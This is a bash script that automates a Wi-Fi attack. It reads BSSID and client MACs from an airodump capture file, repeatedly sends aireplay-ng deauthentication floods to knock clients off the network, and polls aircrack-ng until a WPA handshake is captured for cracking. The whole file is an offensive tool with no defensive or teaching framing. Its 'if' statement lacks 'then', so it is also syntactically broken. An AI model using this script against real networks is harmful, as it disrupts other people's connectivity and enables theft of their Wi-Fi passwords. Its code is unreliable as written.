#!/bin/bash
#Need to get the BSSID Name
echo "BSSID Name? (Case Sensitive): "
read BSSIDNAME

BSSID=$(cat "$1" | awk -F',' 'NR>2{print $1}' | sed -e '/Station MAC/d' -e '/BSSID/d' -e '/\n/d' | sed -n 1p)

until [ -n "$SUCCESS" ]; do
  for STATION in $(cat "$1" | awk -F',' 'NR>5{print $1}' | sed -e '/Station MAC/d' -e '/BSSID/d' | sed -e '/^.$/d' ); do
    aireplay-ng --deauth 5 -a $BSSID -c $STATION wlan1mon;
  done
SUCCESS=$(aircrack-ng "${BSSIDNAME}-01.cap" -w fakewordlist | grep "WPA (. handshake)")
 if [ -z "$SUCCESS" ]; 
  sleep 5m
 fi
done
